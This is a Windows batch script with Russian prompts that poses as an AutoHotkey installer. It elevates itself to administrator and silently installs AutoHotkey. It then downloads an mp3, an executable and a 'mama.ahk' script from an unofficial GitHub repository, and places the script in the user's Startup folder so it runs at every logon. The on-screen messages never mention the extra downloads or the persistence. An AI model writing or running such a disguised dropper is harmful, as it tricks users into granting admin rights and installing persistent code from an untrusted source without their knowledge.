@echo off
cls

NET FILE 1>NUL 2>NUL
if '%errorlevel%' == '0' (
    goto continue
) else (
    echo Установка AutoHotkey...
    timeout /t 1 >nul
    start "" "powershell" -Command "Start-Process '%0' -Verb RunAs"
    exit
)

:continue
setlocal enabledelayedexpansion

set mobilnik_dest=C:\Users\mobilnik.mp3
set mama_dest=C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\mama.ahk
set autohotkey_exe_dest=C:\ProgramData\Microsoft\Windows\Start Menu\Programs\AutoHotkey\AutoHotkeyU64.exe

powershell -Command "& { Invoke-WebRequest -Uri 'https://www.autohotkey.com/download/ahk-install.exe' -OutFile 'ahk-install.exe' }"

if %errorlevel% neq 0 (
    echo Ошибка! Не удалось загрузить установщик AutoHotkey.
    pause
    exit
)

echo Установка AutoHotkey...
start /wait "" "ahk-install.exe" /S

REM
del "ahk-install.exe"

powershell -Command "& { Invoke-WebRequest -Uri 'https://github.com/curtishdev/MamaApp/raw/main/mobilnik.mp3' -OutFile '!mobilnik_dest!' }"

if %errorlevel% neq 0 (
    echo Ошибка! Музыка не найдена.
    pause
    exit
)

powershell -Command "& { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/curtishdev/MamaApp/main/mama.ahk' -OutFile '!mama_dest!' }"

if %errorlevel% neq 0 (
    echo Ошибка! Приложение не найдено.
    pause
    exit
)

powershell -Command "& { Invoke-WebRequest -Uri 'https://github.com/curtishdev/MamaApp/raw/main/AutoHotkeyU64.exe' -OutFile '!autohotkey_exe_dest!' }"

if %errorlevel% neq 0 (
    echo Ошибка! AutoHotkeyU64.exe не найден.
    pause
    exit
)

REM
taskkill /F /IM AutoHotkeyU64.exe 2>nul

echo Установите AutoHotkey! 
echo Нажмите [Enter] чтобы продолжить.
pause

exit

endlocal